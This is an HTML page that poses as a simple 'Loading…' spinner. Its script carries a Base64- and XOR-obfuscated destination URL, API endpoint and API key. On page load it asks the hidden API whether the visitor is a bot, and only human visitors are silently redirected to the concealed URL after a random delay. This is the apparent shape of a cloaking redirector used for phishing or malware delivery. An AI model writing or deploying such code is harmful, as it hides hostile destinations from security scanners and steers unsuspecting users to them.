<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Loading…</title>
<style>
  :root{--bg:#fff;--txt:#222}
  @media (prefers-color-scheme: dark){:root{--bg:#0e0e0e;--txt:#f2f2f2}}
  html,body{height:100%;margin:0;background:var(--bg);color:var(--txt);font-family:Inter,Segoe UI,Arial;}
  #wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;opacity:0;transition:opacity .25s}
  .spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,0.08);border-top:6px solid #ff3b30;animation:spin 1s linear infinite}
  .txt{margin-top:12px;font-size:15px}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div id="wrap" aria-hidden="true">
  <div class="spinner"></div>
  <div class="txt">Loading…</div>
</div>

<script>
(function(){

  const XORKEY = 137;

  const ENC_URL = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
  const ENC_API = "4/Hr7eCvr6jk7eTu6/Dg6uP07/H87f7l4+v37b3i6PXm7uGmwLbo7rmtsNf/8OQ=";
  const ENC_KEY = "4e/o6uXrreLw6+Li5vHb5eP86f/o7eP47vDu4vXv6PLh6ebkz+Hu7PyGuQ==";

  function b64Bytes(b){
    const bin = atob(b), L = bin.length, arr = new Uint8Array(L);
    for(let i=0;i<L;i++) arr[i] = bin.charCodeAt(i);
    return arr;
  }

  function xor(bytes){
    const out = new Uint8Array(bytes.length);
    for(let i=0;i<bytes.length;i++) out[i] = bytes[i] ^ XORKEY;
    return out;
  }

  function toStr(bytes){
    try{return new TextDecoder().decode(bytes);}catch(e){
      let s=""; for(let i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]);
      return decodeURIComponent(escape(s));
    }
  }

  const wrap = document.getElementById("wrap");
  function showSpinner(){
    wrap.style.opacity = 1;
    wrap.style.pointerEvents = "auto";
  }

  async function main(){
    const API_URL = toStr(xor(b64Bytes(ENC_API)));
    const API_KEY = toStr(xor(b64Bytes(ENC_KEY)));

    let data = null;

    try{
      const res = await fetch(API_URL, {
        method:"GET",
        cache:"no-store",
        headers:{
          "x-api-key": API_KEY,
          "Accept":"application/json",
          "X-Req": Math.random().toString(36).slice(2)
        }
      });

      if(!res.ok) return;

      data = await res.json().catch(()=>null);
      if(!data) return;

    }catch(e){
      return;
    }

    if(data.bot === true) return;

    showSpinner();

    await new Promise(r=>setTimeout(r, 400 + Math.random()*500));

    const REAL_URL = toStr(xor(b64Bytes(ENC_URL)));

    if(REAL_URL.startsWith("http")){
      location.replace(REAL_URL);
    }
  }

  main();

})();
</script>

</body>
</html>
